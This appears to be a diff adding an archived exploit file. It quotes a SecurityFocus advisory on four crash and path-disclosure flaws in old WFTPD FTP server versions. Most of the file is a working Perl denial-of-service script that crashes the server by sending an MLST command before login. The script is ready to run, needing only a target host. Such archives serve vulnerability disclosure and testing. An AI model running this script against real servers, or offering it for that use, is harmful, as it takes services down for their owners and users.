@@ -1,0 +1,51 @@
+source: http://www.securityfocus.com/bid/1506/info
+  
+WFTPD versions prior to 2.4.1RC11 suffer from a number of vulnerabilities.
+  
+1) Issuing a STAT command while a LIST is in progress will cause the ftp server to crash.
+2) If the REST command is used to write past the end of a file or to a non-existant file (with STOU, STOR, or APPE), the ftp server will crash.
+3) If a transfer is in progress and a STAT command is issued, the full path and filename on the server is revealed.
+4) If an MLST command is sent without first logging in with USER and PASS, the ftp server will crash.
+
+#!/usr/bin/perl
+#
+# WFTPD/WFTPD Pro 2.41 RC11 denial-of-service #3
+# Blue Panda - bluepanda@dwarf.box.sk
+# http://bluepanda.box.sk/
+#
+# ----------------------------------------------------------
+# Disclaimer: this file is intended as proof of concept, and
+# is not intended to be used for illegal purposes. I accept
+# no responsibility for damage incurred by the use of it.
+# ----------------------------------------------------------
+#
+# Sends an MLST command without logging in with USER and PASS first, causing
+# WFTPD to crash. Note: MLST is not enabled by default, and must be for this
+# to work.
+#
+
+use IO::Socket;
+
+$host = "ftp.host.com" ;
+$port = "21";
+$wait = 10;
+
+# Connect to server.
+print "Connecting to $host:$port...";
+$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$host, PeerPort=>$port) || die "failed.\n";
+print "done.\n";
+
+print $socket "MLST a\n";
+
+# Wait a while, just to make sure the command arrives.
+print "Waiting...";
+$time = 0;
+while ($time < $wait) {
+        sleep(1);
+        print ".";
+        $time += 1;
+}
+
+# Finished.
+close($socket);
+print "\nConnection closed. Finished.\n"
